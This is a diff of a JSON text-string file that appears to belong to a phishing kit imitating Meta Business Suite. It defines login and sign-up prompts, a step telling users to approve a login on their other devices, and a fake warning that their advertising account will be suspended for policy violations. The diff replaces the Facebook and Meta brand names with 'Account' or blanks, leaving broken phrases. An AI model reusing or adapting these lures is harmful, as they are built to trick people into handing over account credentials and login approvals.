@@ -29,15 +29,15 @@
     },
     {
         "code": "login_with_facebook",
-        "name": "Log in with Facebook",
-        "description": "Log in with Facebook",
+        "name": "Log in with Account",
+        "description": "Log in with Account",
         "position": "welcome",
         "language_id": 0
     },
     {
         "code": "title",
-        "name": "Meta Business Suite",
-        "description": "Meta Business Suite",
+        "name": " Business Suite",
+        "description": " Business Suite",
         "position": "login",
         "language_id": 0
     },
@@ -78,8 +78,8 @@
     },
     {
         "code": "login_box_title",
-        "name": "Log in to Facebook",
-        "description": "Log in to Facebook",
+        "name": "Log in to Account",
+        "description": "Log in to Account",
         "position": "login",
         "language_id": 0
     },
@@ -113,8 +113,8 @@
     },
     {
         "code": "sign_up_to_facebook",
-        "name": "Sign up for Facebook",
-        "description": "Sign up for Facebook",
+        "name": "Sign up for Account",
+        "description": "Sign up for Account",
         "position": "login",
         "language_id": 0
     },
@@ -155,8 +155,8 @@
     },
     {
         "code": "sub_title_notice",
-        "name": "We already sent a notification to your logged-in devices. Check your Facebook notifications where you're already logged in to the account and approve the login to continue.",
-        "description": "We already sent a notification to your logged-in devices. Check your Facebook notifications where you're already logged in to the account and approve the login to continue.",
+        "name": "We already sent a notification to your logged-in devices. Check your Account notifications where you're already logged in to the account and approve the login to continue.",
+        "description": "We already sent a notification to your logged-in devices. Check your Account notifications where you're already logged in to the account and approve the login to continue.",
         "position": "confirm",
         "language_id": 0
     },
@@ -404,15 +404,15 @@
 
     {
         "code": "introduce_welcome",
-        "name": "Welcome to the Facebook Information Center",
-        "description": "Welcome to the Facebook Information Center",
+        "name": "Welcome to the Account Information Center",
+        "description": "Welcome to the Account Information Center",
         "position": "introduce",
         "language_id": 0
     },
     {
         "code": "introduce_notice",
-        "name": "We have noticed that your account has engaged in inappropriate advertising behavior. According to Facebook's policy, your advertising account will be temporarily suspended starting from",
-        "description": "We have noticed that your account has engaged in inappropriate advertising behavior. According to Facebook's policy, your advertising account will be temporarily suspended starting from",
+        "name": "We have noticed that your account has engaged in inappropriate advertising behavior. According to Account's policy, your advertising account will be temporarily suspended starting from",
+        "description": "We have noticed that your account has engaged in inappropriate advertising behavior. According to Account's policy, your advertising account will be temporarily suspended starting from",
         "position": "introduce",
         "language_id": 0
     },
@@ -524,8 +524,8 @@
     },
     {
         "code": "home_hint",
-        "name": "(Your meta Account Information)",
-        "description": "(Your meta Account Information)",
+        "name": "(Your  Account Information)",
+        "description": "(Your  Account Information)",
         "position": "home",
         "language_id": 0
     },
@@ -538,15 +538,15 @@
     },
     {
         "code": "home_infomation",
-        "name": "For more information about how Meta handles your data please read our",
-        "description": "For more information about how Meta handles your data please read our",
+        "name": "For more information about how handles your data please read our",
+        "description": "For more information about how handles your data please read our",
         "position": "home",
         "language_id": 0
     },
     {
         "code": "home_privacy",
-        "name": "Meta Privacy Policy",
-        "description": "Meta Privacy Policy",
+        "name": "Privacy Policy",
+        "description": "Privacy Policy",
         "position": "home",
         "language_id": 0
     },
